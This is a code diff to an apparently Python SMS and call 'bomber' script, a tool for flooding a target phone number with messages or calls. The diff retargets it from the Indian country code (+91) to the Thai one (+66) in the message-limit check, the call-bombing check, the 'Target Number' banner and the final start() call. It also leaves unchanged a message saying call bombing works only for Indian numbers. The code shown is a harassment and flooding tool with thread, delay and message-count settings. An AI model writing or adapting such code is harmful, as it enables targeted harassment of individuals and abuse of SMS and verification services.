@@ -561,7 +561,7 @@ elif type == 0:
         dl = float(
             input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
 maxlim = 0
-if cc == "91":
+if cc == "66":
     maxlim = 500
 else:
     maxlim = 100
@@ -570,7 +570,7 @@ if nm > maxlim:
           str(maxlim) + ' SMS At Once...\n\n')
     print('Number Of SMS Has been Set To ' + str(maxlim))
     nm = maxlim
-if not cc.strip() == "91":
+if not cc.strip() == "66":
     if type == 1:
         print(
             '\t\tSorry But Call Bombing is Currently Supported Only For Indian Numbers!!!!')
@@ -614,7 +614,7 @@ if nm == 0:
     print("                Gearing Up Bomber, please wait !!               ")
     print("     Please keep your data connection active during bombing !!    ")
     print("==================================================================")
-    print("             Target Number       : +91", pn)
+    print("             Target Number       : +66", pn)
     print("             Number of Threads   : ", nt)
     print("             Delay               : ", dl)
     print("==================================================================")
@@ -646,5 +646,5 @@ if nm == 0:
         if ci % 3 == 0:
             checkinternet()
 else:
-    start(pn, nm, dl, ch, '91')
+    start(pn, nm, dl, ch, '66')
     exit()
